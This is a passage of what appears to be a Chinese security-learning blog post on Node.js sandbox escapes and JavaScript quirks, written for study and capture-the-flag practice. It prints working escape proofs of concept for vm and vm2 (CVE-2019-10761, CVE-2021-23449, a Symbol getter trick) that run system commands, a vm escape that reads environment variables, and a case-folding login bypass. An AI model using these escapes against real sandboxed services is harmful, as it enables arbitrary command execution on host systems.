<pre><code class="hljs js"><span class="hljs-keyword">const</span> {<span class="hljs-variable constant_">VM</span>, <span class="hljs-title class_">VMScript</span>} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm2'</span>);

<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> <span class="hljs-title class_">VMScript</span>(<span class="hljs-string">"let a = 2;a;"</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>((<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>()).<span class="hljs-title function_">run</span>(script));</code></pre>
<p><code>VM</code>是vm2在vm的基础上封装的一个虚拟机，我们只需要实例化后调用其中的run方法就可以运行一段脚本。</p>
<p>那么vm2在运行这两行代码时都做了什么事：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030210832366.png" alt="image-20231030210832366"></p>
<p>可以发现相比于vm的沙箱环境，vm2最重要的一步就是引入<code>sandbox.js</code>并针对context做封装。</p>
<p>那么vm2具体是怎么实现对context的封装？</p>
<p>vm2出现过多次逃逸的问题，所以现有的代码被进行了大量修改，为了方便分析需要使用较老版本的vm2，但github上貌似将3.9以前的版本全都删除了，所以我这里也找不到对应的资源了，代码分析也比较麻烦，直接移步链接：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/207283#h2-1">vm2实现原理分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<h2 id="67-vm2中的沙箱绕过">6.7 vm2中的沙箱绕过</h2>
<h3 id="cve-2019-10761">CVE-2019-10761</h3>
<p>该漏洞要求vm2版本&lt;=3.6.10</p>
<pre><code class="hljs js"><span class="hljs-meta">"use strict"</span>;
<span class="hljs-keyword">const</span> {<span class="hljs-variable constant_">VM</span>} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm2'</span>);
<span class="hljs-keyword">const</span> untrusted = <span class="hljs-string">`</span>
<span class="hljs-string">const f = Buffer.prototype.write;</span>
<span class="hljs-string">const ft = {</span>
<span class="hljs-string">        length: 10,</span>
<span class="hljs-string">        utf8Write(){</span>
<span class="hljs-string"></span>
<span class="hljs-string">        }</span>
<span class="hljs-string">}</span>
<span class="hljs-string">function r(i){</span>
<span class="hljs-string">    var x = 0;</span>
<span class="hljs-string">    try{</span>
<span class="hljs-string">        x = r(i);</span>
<span class="hljs-string">    }catch(e){}</span>
<span class="hljs-string">    if(typeof(x)!=='number')</span>
<span class="hljs-string">        return x;</span>
<span class="hljs-string">    if(x!==i)</span>
<span class="hljs-string">        return x+1;</span>
<span class="hljs-string">    try{</span>
<span class="hljs-string">        f.call(ft);</span>
<span class="hljs-string">    }catch(e){</span>
<span class="hljs-string">        return e;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">    return null;</span>
<span class="hljs-string">}</span>
<span class="hljs-string">var i=1;</span>
<span class="hljs-string">while(1){</span>
<span class="hljs-string">    try{</span>
<span class="hljs-string">        i=r(i).constructor.constructor("return process")();</span>
<span class="hljs-string">        break;</span>
<span class="hljs-string">    }catch(x){</span>
<span class="hljs-string">        i++;</span>
<span class="hljs-string">    }</span>
<span class="hljs-string">}</span>
<span class="hljs-string">i.mainModule.require("child_process").execSync("whoami").toString()</span>
<span class="hljs-string">`</span>;
<span class="hljs-keyword">try</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">VM</span>().<span class="hljs-title function_">run</span>(untrusted));
}<span class="hljs-keyword">catch</span>(x){
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x);
}</code></pre>
<p>这个链子在p牛的知识星球上有，很抽象，沙箱逃逸说到底就是要从沙箱外获取一个对象，然后获得这个对象的constructor属性，这条链子获取沙箱外对象的方法是 在沙箱内不断递归一个函数，当递归次数超过当前环境的最大值时，我们正好调用沙箱外的函数，就会导致沙箱外的调用栈被爆掉，我们在沙箱内catch这个异常对象，就拿到了一个沙箱外的对象。举个例子：</p>
<p>假设当前环境下最大递归值为1000，我们通过程序控制递归999次（注意这里说的递归值不是一直调用同一个函数的最大值，而是单次程序内调用函数次数的最大值，也就是调用栈的最大值）：</p>
<pre><code class="hljs js"><span class="hljs-title function_">r</span>(i);      <span class="hljs-comment">// 该函数递归999次</span>

f.<span class="hljs-title function_">call</span>(ft);    <span class="hljs-comment">// 递归到第1000次时调用f这个函数，f为Buffer.prototype.write，就是下面图片的这个函数</span>

<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">utf8Write</span>()   <span class="hljs-comment">// 递归到1001次时为该函数，是一个外部函数，所以爆栈时捕捉的异常也是沙箱外，从而返回了一个沙箱                   外的异常对象</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030210859697.png" alt="image-20231030210859697"></p>
<h3 id="cve-2021-23449">CVE-2021-23449</h3>
<p>这个漏洞在snyk解释是原型链污染导致的沙箱逃逸，但p牛在知识星球里发了其实是另外的原因</p>
<p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-VM2-1585918">Sandbox Bypass in vm2 | CVE-2021-23449 | Snyk</a></p>
<p>poc：</p>
<pre><code class="hljs js"><span class="hljs-keyword">let</span> res = <span class="hljs-keyword">import</span>(<span class="hljs-string">'./foo.js'</span>)
res.<span class="hljs-property">toString</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">"return this"</span></span>)(<span class="hljs-params"></span>).<span class="hljs-property">process</span>.<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">"whoami"</span>).<span class="hljs-title function_">toString</span>();</code></pre>
<p>import()在JavaScript中是一个语法结构，不是函数，没法通过之前对require这种函数处理相同的方法来处理它，导致实际上我们调用import()的结果实际上是没有经过沙箱的，是一个外部变量。 我们再获取这个变量的属性即可绕过沙箱。 vm2对此的修复方法也很粗糙，正则匹配并替换了\bimport\b关键字，在编译失败的时候，报Dynamic Import not supported错误。</p>
<h3 id="知识星球上的另外一个trick"><strong>知识星球上的另外一个trick</strong></h3>
<pre><code class="hljs js"><span class="hljs-title class_">Symbol</span> = {
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">toStringTag</span>(){
    <span class="hljs-keyword">throw</span> <span class="hljs-function"><span class="hljs-params">f</span>=&gt;</span>f.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">"return process"</span></span>)(<span class="hljs-params"></span>)
  }
};
<span class="hljs-keyword">try</span>{
  <span class="hljs-title class_">Buffer</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());
}<span class="hljs-keyword">catch</span>(f){
  <span class="hljs-title class_">Symbol</span> = {};
  <span class="hljs-title function_">f</span>(<span class="hljs-function">()=&gt;</span>{}).<span class="hljs-property">mainModule</span>.<span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">"whoami"</span>).<span class="hljs-title function_">toString</span>();
}</code></pre>
<p>在vm2的原理中提到vm2会为对象配置代理并初始化，如果对象是以下类型：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030211017609.png" alt="image-20231030211017609"></p>
<p>就会return <code>Decontextify.instance</code> 函数，这个函数中用到了Symbol全局对象，我们可以通过劫持Symbol对象的getter并抛出异常，再在沙箱内拿到这个异常对象就可以了</p>
<h2 id="68-简单理解">6.8 简单理解</h2>
<p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序。但是可以通过构造语句来进行逃逸：</p>
<p>逃逸例子：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);
<span class="hljs-keyword">const</span> env = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`this.constructor.constructor('return this.process.env')()`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);</code></pre>
<p>执行之后可以获取到主程序环境中的环境变量</p>
<p>上面例子的代码等价于如下代码：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vm'</span>);
<span class="hljs-keyword">const</span> sandbox = {};
<span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">"this.constructor.constructor('return this.process.env')()"</span>);
<span class="hljs-keyword">const</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox);
env = script.<span class="hljs-title function_">runInContext</span>(context);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);</code></pre>
<p>创建vm环境时，首先要初始化一个对象 sandbox，这个对象就是vm中脚本执行时的全局环境context，vm 脚本中全局 this 指向的就是这个对象。</p>
<p>因为<code>this.constructor.constructor</code>返回的是一个<code>Function constructor</code>，所以可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是<code>return this.process.env</code>，结果是返回了主程序的环境变量。</p>
<p>配合<code>chile_process.exec()</code>就可以执行任意命令了：</p>
<pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">"vm"</span>);
<span class="hljs-keyword">const</span> env = vm.<span class="hljs-title function_">runInNewContext</span>(<span class="hljs-string">`const process = this.constructor.constructor('return this.process')();</span>
<span class="hljs-string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(env);</code></pre>
<p>最近的mongo-express RCE(CVE-2019-10758)漏洞就是配合vm沙箱逃逸来利用的。</p>
<p>具体分析可参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCE复现分析</a></p>
<h2 id="69-javascript大小写特性">6.9 javascript大小写特性</h2>
<p>在javascript中有几个特殊的字符需要记录一下</p>
<p>对于toUpperCase():</p>
<pre><code class="hljs plaintext">字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"</code></pre>
<p>对于toLowerCase():</p>
<pre><code class="hljs plaintext">字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)</code></pre>
<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
<p>可参考p神的文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
<h2 id="610-ctf题实例-hacktm中的一道nodejs题">6.10 CTF题实例 - Hacktm中的一道Nodejs题</h2>
<p>题目部分源码：</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidUser</span>(<span class="hljs-params">u</span>) {
  <span class="hljs-keyword">return</span> (
    u.<span class="hljs-property">username</span>.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">3</span> &amp;&amp;
    u.<span class="hljs-property">username</span>.<span class="hljs-title function_">toUpperCase</span>() !== config.<span class="hljs-property">adminUsername</span>.<span class="hljs-title function_">toUpperCase</span>()
  );
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">isAdmin</span>(<span class="hljs-params">u</span>) {
  <span class="hljs-keyword">return</span> u.<span class="hljs-property">username</span>.<span class="hljs-title function_">toLowerCase</span>() == config.<span class="hljs-property">adminUsername</span>.<span class="hljs-title function_">toLowerCase</span>();
}</code></pre>
<p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p>
<p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p>
<p>题目中默认的管理员用户名为：hacktm</p>
<p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p>
<p>题目完整Writeup:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7177">HackTM中一道Node.js题分析(Draw with us)</a></p>
<h1 id="0x07-tips">0x07 Tips</h1>
<h2 id="71-fs-文件系统">7.1 fs 文件系统</h2>
<blockquote>
<p>fs 模块支持以标准 POSIX 函数建模的方式与文件系统进行交互。</p>
</blockquote>
<p>其中最简单的一个就是文件读取的操作</p>
<p>但是我们得分清楚</p>
<p><strong>同步和异步</strong></p>
<p>区别：</p>
<blockquote>
<p>同步阻塞：同步的 API 会阻止 Node.js 事件循环和进一步的 JavaScript 执行，直到操作完成。<br>
异步阻塞：对于一个 IO 操作，比如一个 ajax，当发出一个异步请求后，程序不会阻塞在那里等待结果的返回，而是继续执行下面的代码。</p>
</blockquote>
<p>当请求成功获取到结果后，就会调用回调函数来处理后面的事情，这个就是异步</p>
<p>简单但不完全正确的说：</p>
<blockquote>
<p>同异步与现实生活的方式相反，同步就是事一件一件做，做完一件再做下一件，而异步是同时开始。</p>
</blockquote>
<p>举个例子</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);<span class="hljs-comment">//导入fs模块</span>
a = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'./m1.txt'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a.<span class="hljs-title function_">toString</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"结束!"</span>);</code></pre>
<p>这是同步，它的输出结果为</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030211700937.png" alt="image-20231030211700937"></p>
<p>很明显是等待每个操作完成，然后执行下一个操作</p>
<p>接下来是异步</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);<span class="hljs-comment">//导入fs模块</span>
fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'./m1.txt'</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, data</span>) {
    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data.<span class="hljs-title function_">toString</span>());
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"------------------"</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"现在才结束！"</span>)
});

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"结束？"</span>);</code></pre>
<p>这是就是异步，它的输出结果为</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030211817842.png" alt="image-20231030211817842"></p>
<p>异步从不等待每个操作完成，而是在第一步执行所有操作</p>
<h2 id="72-全局变量展开">7.2 全局变量展开</h2>
<ol>
<li>__dirname：当前模块的目录名。</li>
<li>__filename：当前模块的文件名。这是当前的模块文件的绝对路径（符号链接会被解析）。</li>
<li>exports 变量是默认赋值给 module.exports，它可以被赋予新值，它会暂时不会绑定到 module.exports。</li>
<li>module：在每个模块中， module 的自由变量是对表示当前模块的对象的引用。为方便起见，还可以通过全局模块的 exports</li>
<li>访问 module.exports。module 实际上不是全局的，而是每个模块本地的</li>
<li>require 模块就不多说了，用于引入模块、 JSON、或本地文件。可以从 node_modules 引入模块。</li>
</ol>
<p>我们常用的全局变量为<code>__dirname和__filename</code></p>
<h2 id="73-child_process">7.3 child_process</h2>
<p>child_process 提供了几种创建子进程的方式</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231030211954466.png" alt="image-20231030211954466"></p>
<blockquote>
<p>异步方式：spawn、exec、execFile、fork<br>
同步方式：spawnSync、execSync、execFileSync</p>
</blockquote>
<p>经过上面的同步和异步思想的理解，创建子进程的同步异步方式应该不难理解。</p>
<p><strong>异步进程的创建</strong></p>
<ul>
<li>child_process.exec (): 衍生 shell 并在该 shell 中运行命令，完成后将 stdout 和 stderr<br>
传给回调函数。</li>
<li>child_process.execFile (): 与 child_process.exec ()<br>
类似，不同之处在于，默认情况下，它直接衍生命令，而不先衍生 shell。</li>
<li>child_process.fork (): 衍生新的 Node.js 进程并使用建立的 IPC<br>
通信通道（其允许在父子进程之间发送消息）调用指定的模块。</li>
<li>child_process.execSync (): child_process.exec () 的同步版本，其将阻塞 Node.js<br>
事件循环。</li>
<li>child_process.execFileSync (): child_process.execFile () 的同步版本，其将阻塞<br>
Node.js 事件循环。</li>
</ul>
<p><strong>同步进程的创建</strong><br>
child_process.spawnSync ()、child_process.execSync () 和 child_process.execFileSync () 方法是同步的，将阻塞 Node.js 事件循环，</p>
<p>暂停任何其他代码的执行，直到衍生的进程退出。</p>
<p>具体的细节大家可以去官方文档看看</p>
<h1 id="0x08-参考文章">0x08 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击 </a>–p神</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/cnily03/tech/js-prototype-pollution">JavaScript 原型链污染</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859#toc-0">NodeJS VM和VM2沙箱逃逸</a></p>
<p><a target="_blank" rel="noopener" href="https://ljdd520.github.io/2020/03/14/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%80%BB%E7%BB%93/">Node.js常见漏洞学习与总结</a></p>
<p><a target="_blank" rel="noopener" href="http://blog.m1kael.cn/index.php/archives/27/">NodeJs从零到原型链污染</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/')">JavaScript原型链污染学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=JavaScript原型链污染学习&amp;url=http://hybcx.xyz/2023/10/29/javascript-yuan-xing-lian-wu-ran/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/28/wu-hui-xian-ming-ling-zhi-xing/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">无回显命令执行</div></div></a></div><div class="next-post pull-right"><a href="/2023/11/12/wen-jian-shang-chuan-zhi-pearcmd/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">浅析pearcmd.php漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E6%89%80%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">0x02 危险函数所导致的命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-eval"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 eval()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E7%B1%BB%E4%BC%BC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 类似命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-javascript%E7%B1%BB"><span class="toc-number">3.</span> <span class="toc-text">0x03 JavaScript类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E7%B1%BB%E7%9A%84%E5%A3%B0%E6%98%8E"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 类的声明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-new-%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 new 做了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-%E6%9E%84%E9%80%A0%E5%99%A8-constructor"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 构造器 constructor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E5%8E%9F%E5%9E%8B%E5%92%8C%E7%BB%A7%E6%89%BF"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 原型和继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E5%8E%9F%E5%9E%8B%E5%AF%B9%E8%B1%A1-prototype-%E5%92%8C-proto"><span class="toc-number">3.5.</span> <span class="toc-text">3.5 原型对象 prototype 和 proto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BEnew-%E5%88%B0%E5%BA%95%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 继承与原型链：new 到底做了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 原型链污染</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-javascript-prototype-%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">0x04 深入理解 JavaScript Prototype 污染攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-prototype%E5%92%8C__proto__%E5%88%86%E5%88%AB%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 prototype和__proto__分别是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 JavaScript原型链继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 原型链污染是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 